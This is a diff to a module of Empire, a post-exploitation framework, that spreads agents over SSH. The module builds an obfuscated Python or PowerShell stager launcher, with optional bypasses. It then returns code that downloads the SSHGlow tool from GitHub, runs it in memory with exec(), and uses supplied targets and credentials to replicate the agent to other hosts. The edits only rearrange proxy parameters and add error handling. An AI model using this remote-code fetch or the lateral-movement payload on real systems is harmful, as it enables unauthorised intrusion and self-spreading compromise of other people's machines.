@@ -20,8 +20,6 @@ class Module(object):
         language = params['Language']
         listenerName = params['Listener']
         userAgent = params['UserAgent']
-        proxy = params['Proxy']
-        proxy_creds = params['ProxyCreds']
         safeChecks = params['SafeChecks']
         obfuscate = params['Obfuscate'].lower() == 'true'
         obfuscate_command = params['ObfuscateCommand']
@@ -49,8 +47,8 @@ class Module(object):
 
             # Generate the launcher code
             if language.lower() == 'python':
-                cmd = 'nohup ' + main_menu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, 
-                                                                proxy=proxy, proxy_creds=proxy_creds, safeChecks=safeChecks)
+                cmd = 'nohup ' + main_menu.stagers.generate_launcher(listenerName, 
+                            language='python', userAgent=userAgent, safeChecks=safeChecks)
                 
                 cmd = cmd.replace("'", "\\'")
                 cmd = cmd.replace('"', '\\"')
@@ -60,7 +58,7 @@ class Module(object):
                 # Generate the PowerShell one-liner with all of the proper options set
                 cmd = main_menu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
                                                                obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
-                                                               userAgent=userAgent, proxy=proxy, proxyCreds=proxy_creds,
+                                                               userAgent=userAgent, proxy=params['Proxy'], proxyCreds=params['ProxyCreds'],
                                                                bypasses=params['Bypasses'])
 
                 
@@ -72,13 +70,17 @@ class Module(object):
 
 
         # Code will load SSHGlow tool in memory and call run function
+        # We Must use globals in exec function because empire agent will put our code in function and call it with reflection
+        
 
         return f"""
             import urllib
             from urllib.request import urlopen
             try:
-                exec(urlopen("https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py").read().decode("utf-8"))
+                exec(urlopen("https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py").read().decode("utf-8"),globals())
                 run("{targets}","{creds}",delay={delay},no_replicate={noReplicate},cmd="{cmd}")
             except urllib.error.URLError:
                 print("\033[0;31m[!]\033[0;37m We need internet access to load SSHGlow")
+            except Exception as e:
+                print("\033[0;31m[!]\033[0;37m Error occured -> ",e)
         """.replace('            ','')
